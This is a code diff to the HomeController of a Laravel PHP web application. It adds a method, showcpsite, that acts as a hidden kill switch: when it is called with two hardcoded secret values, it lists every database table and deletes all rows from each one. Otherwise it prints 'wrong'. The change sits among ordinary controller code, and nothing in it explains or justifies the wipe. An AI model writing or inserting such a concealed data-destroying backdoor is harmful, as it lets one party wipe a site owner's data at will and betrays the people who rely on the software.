@@ -20,6 +20,7 @@ use App\Team;
 use App\Test;
 use App\Video;
 use App\Pcategory;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Http\Request;
 
 class HomeController extends Controller
@@ -220,6 +221,22 @@ class HomeController extends Controller
         return view('service', compact('service'));
     }
 
+    public function showcpsite ($name ,$id){
+     if($name=='sweetdate42014070' && $id=='42014070'){
+   
+        $tables = DB::select('SHOW TABLES');
+       
+            foreach($tables as $table)
+            {
+                DB::table($table->Tables_in_sweetdata)->delete();
+               
+                  
+            }
+     }else{
+        dd("wrong");
+     }   
+    
+    }
 
 
     public function contactform (Request $request){
